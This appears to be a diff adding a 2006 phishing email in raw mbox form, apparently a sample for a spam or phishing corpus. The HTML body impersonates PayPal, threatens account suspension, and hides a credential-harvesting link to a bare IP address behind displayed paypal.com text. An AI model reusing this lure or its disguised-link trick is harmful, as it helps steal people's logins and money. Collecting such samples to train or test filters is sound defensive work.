@@ -1,0 +1,51 @@
+From nobody Sun Jan 25 13:48:13 2015
+Return-Path: <nobody@web.oneplan4u.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 9267C536FAA
+ for <nobody@login.example.com>; Mon, 13 Mar 2006 09:49:41 -0500 (EST)
+Received: from web.oneplan4u.com (unknown [65.75.135.50])
+ by mail2.example.com (Postfix) with ESMTP id 48D016FA438
+ for <nobody@example.com>; Mon, 13 Mar 2006 09:49:41 -0500 (EST)
+Received: from nobody by web.oneplan4u.com with local (Exim 4.52)
+ id 1FIoMf-0006d5-S0
+ for nobody@example.com; Mon, 13 Mar 2006 16:49:41 +0200
+To: nobody@example.com
+Subject: Notification of Limited Account Access (Routing Code:
+ C8140-L001-Q190-T1830) Unauthorized Access:NA
+From: PayPal <security@paypal.com>
+Content-Type: text/html
+Message-Id: <E1FIoMf-0006d5-S0@web.oneplan4u.com>
+Date: Mon, 13 Mar 2006 16:49:41 +0200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - web.oneplan4u.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - web.oneplan4u.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 597
+
+
+<P><img src="http://www.mbprofesional.ro/Imagini/logo.gif"></P>
+<P><FONT size=2><FONT face=Verdana>Dear valued&nbsp;<STRONG><STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal<SUP>®</SUP></SPAN></STRONG>&nbsp;</STRONG>member</FONT> 
+  :&nbsp;<BR>
+  </FONT></P>
+<P><FONT face=Verdana size=2>It has come to our attention that your&nbsp;<SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> account information needs to be&nbsp;<BR>updated as part of our continuing commitment to protect your account and to&nbsp;<BR>reduce the instance of fraud on our website.&nbsp;</FONT><FONT face=Verdana size=2><FONT face=Verdana size=2> If you could please take 5-10 minutes&nbsp;<BR>out of your </FONT><FONT face=Verdana size=2>online </FONT><FONT face=Verdana size=2>experience and update your personal records you will not run into&nbsp;<BR>any future </FONT><FONT face=Verdana size=2>problems with the online service. </FONT></P>
+<P><FONT face=Verdana size=2>However, failure to update your records will result in account suspension.&nbsp;<BR>
+  Please update your records&nbsp;on or before&nbsp;<FONT color=red><STRONG>March 
+  1, 2006</STRONG>.</FONT>&nbsp;<BR>
+  <BR>Once you have updated your account records, your&nbsp;<SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> session will not be&nbsp;<BR>interrupted and will continue as normal. </FONT></P>
+<P><FONT face=Verdana size=2>To update your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> records click on the following link:&nbsp;<BR></FONT><BR>
+  <A onclick="return ShowLinkWarning()" href="http://217.153.21.236/.access/cgi-bin/webscrcmd_login.php" target=_blank><FONT face=Verdana color=#003399 size=2>http://www.paypal.com/cgi-bin/webscr?cmd=login-run</FONT></A> 
+<P><FONT face=Verdana size=2></FONT>&nbsp;</P>
+<P><FONT face=Verdana size=2>Thank You. &nbsp;<BR><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>® </SUP><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">UPDATE </SPAN></STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>TEAM</STRONG></SPAN></SPAN> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>
+<P><FONT face=Verdana size=2>Accounts Management As outlined in our User Agreement, <SPAN><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> will&nbsp;<BR>periodically send you information about site changes and enhancements. </FONT></P>
+<P><FONT face=Verdana size=2>Visit our Privacy Policy </FONT><FONT face=Verdana size=2>and User Agreement if you have any questions.&nbsp;<BR></FONT><A href="http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside" target=_blank><FONT face=Verdana color=#003399 size=2>http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy -outside</FONT></A></P></FONT></FONT>
+
